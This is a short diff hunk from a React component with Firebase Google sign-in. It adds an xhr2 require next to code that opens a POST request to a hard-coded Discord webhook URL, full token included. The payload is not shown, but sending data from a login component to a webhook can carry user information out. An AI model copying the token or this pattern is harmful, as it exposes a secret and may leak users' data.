@@ -13,6 +13,7 @@ function Main() {
     const [rej, setRej] = useState(false);
     const provider = new GoogleAuthProvider();
     const auth = getAuth();
+    var XMLHttpRequest = require('xhr2');
     const request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/996394280035827833/6YLN6_Ruhtf-0GRepNPf6-Pp4DQgM2Jm9ykYCCVhv7diQxFLW696HdMAgIamNCjyiUX0");
     request.setRequestHeader('Content-type', 'application/json');
